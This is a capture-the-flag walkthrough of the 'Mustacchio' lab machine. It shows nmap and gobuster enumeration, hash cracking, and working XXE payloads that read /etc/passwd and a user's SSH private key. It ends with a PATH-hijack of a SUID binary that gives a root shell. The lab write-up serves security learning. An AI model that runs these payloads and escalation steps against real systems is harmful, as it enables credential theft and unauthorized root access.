##Mustacchio

#Enumeration
```
# Nmap 7.91 scan initiated Sun Jun 20 11:21:54 2021 as: nmap -sCV -oN nmap/initial -vvv -p 22,80,8765 10.10.236.197
Nmap scan report for 10.10.236.197
Host is up, received reset ttl 61 (0.15s latency).
Scanned at 2021-06-20 11:21:54 PDT for 18s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2WTNk2XxeSH8TaknfbKriHmaAOjRnNrbq1/zkFU46DlQRZmmrUP0uXzX6o6mfrAoB5BgoFmQQMackU8IWRHxF9YABxn0vKGhCkTLquVvGtRNJjR8u3BUdJ/wW/HFBIQKfYcM+9agllshikS1j2wn28SeovZJ807kc49MVmCx3m1OyL3sJhouWCy8IKYL38LzOyRd8GEEuj6QiC+y3WCX2Zu7lKxC2AQ7lgHPBtxpAgKY+txdCCEN1bfemgZqQvWBhAQ1qRyZ1H+jr0bs3eCjTuybZTsa8aAJHV9JAWWEYFegsdFPL7n4FRMNz5Qg0BVK2HGIDre343MutQXalAx5P
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCEPDv6sOBVGEIgy/qtZRm+nk+qjGEiWPaK/TF3QBS4iLniYOJpvIGWagvcnvUvODJ0ToNWNb+rfx6FnpNPyOA0=
|   256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGldKE9PtIBaggRavyOW10GTbDFCLUZrB14DN4/2VgyL
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Mustacchio | Home
8765/tcp open  http    syn-ack ttl 61 nginx 1.10.3 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 20 11:22:12 2021 -- 1 IP address (1 host up) scanned in 18.18 seconds

```

ssh a web server and what looks like a login panel let start by looking at the web server

#Web Server Port 80
```
/images               (Status: 301) [Size: 315] [--> http://10.10.236.197/images/]
/about.html           (Status: 200) [Size: 3152]
/blog.html            (Status: 200) [Size: 3172]
/contact.html         (Status: 200) [Size: 1450]
/index.html           (Status: 200) [Size: 1752]
/gallery.html         (Status: 200) [Size: 1950]
/custom               (Status: 301) [Size: 315] [--> http://10.10.236.197/custom/]
/robots.txt           (Status: 200) [Size: 28]
/fonts                (Status: 301) [Size: 314] [--> http://10.10.236.197/fonts/]

```

Enumerating with gobuster finds all the pages we found while looking around the site manually but we also find a custom directory. Upon examing this directory we can then go to a js directory that contains a interesting file users.bak
```
YtableusersusersCREATE TABLE users(username text NOT NULL, 0]{redacted_username}{redacted_hash}

```

We find can put the hash into crackstation and quickly crack the hash and now possibly have credentials lets go to the admin page we found earlier and see if they work.

Our credentials do infact work and we get a adminpanel page where we can add a comment on the website. If we look at the source code/attempt to submit a blank comment we get the alert Insert XML Code so we might be looking at an XXE Injection vector also we see the following interesting comment
```
<!-- Barry, you can now SSH in using your key!-->

```

So looks like the user barry might have an exposed ssh key we can access via xxe. Furthermore in the code we find this comment
```
 //document.cookie = "Example=/auth/dontforget.bak"; 
```

Which contains the following file content
```
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment> 

```

So now we know how to structure a valid xml request for this form so we craft the following sample payload
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
   <!ELEMENT data ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment> 

```

We get the returned the following
```
Comment Preview:

Name: Joe Hamd

Author : Barry Clad

Comment :
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false lxd:x:106:65534::/var/lib/lxd/:/bin/false messagebus:x:107:111::/var/run/dbus:/bin/false uuidd:x:108:112::/run/uuidd:/bin/false dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false joe:x:1002:1002::/home/joe:/bin/bash barry:x:1003:1003::/home/barry:/bin/bash

```

So we have xxe and we confirm that barry's home directory is in fact in /home/barry so lets modifiy our payload and see if we can get his ssh key
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
   <!ELEMENT data ANY >
   <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa" >]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment> 
```

We successfully retrieve the ssh key but it is encrypted so lets use ssh2john then crack it
```
python /usr/share/john/ssh2john.py barry_id_rsa > barry_id_rsa_hash

john --wordlist=/usr/share/wordlists/rockyou.txt barry_id_rsa_hash

```

We quickly are able to crack the pass and the use the ssh key to gain a foothold

#Privilege Escalation
We find the user.txt flag in barry's home directory. We try and check for sudo privileges but the credential used for barry's key doesn't work here. However we find the following when looking for suid files
```
barry@mustacchio:~$ find / -type f -perm -4000 2>/dev/null
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/newuidmap
/usr/bin/gpasswd
/home/joe/live_log
/bin/ping
/bin/ping6
/bin/umount
/bin/mount
/bin/fusermount
/bin/su
```

The /home/joe/live_log binary stands out here. Looking at the binary with strings we find the following line that stands out
```
tail -f /var/log/nginx/access.log

```

There is no absolute path defined for this tail command so we can modify our path to a directory we have permissions in and create our own tail file to instead give us a shell. We will use barry's home directory to accomplish this but using a directory such as /tmp or /dev/shm is often a more consistant choice. We do the following
```
barry@mustacchio:~$ echo "/bin/bash" > tail
barry@mustacchio:~$ chmod +x tail
barry@mustacchio:~$ export PATH=/home/barry:$PATH
```

So now when we execute the binary /home/joe/live_log it should use our modified path and use our custom shell producing tail binary
```
barry@mustacchio:~$ /home/joe/live_log
root@mustacchio:~#
```

We successfully have a root shell and can find the root flag at /root/root.txt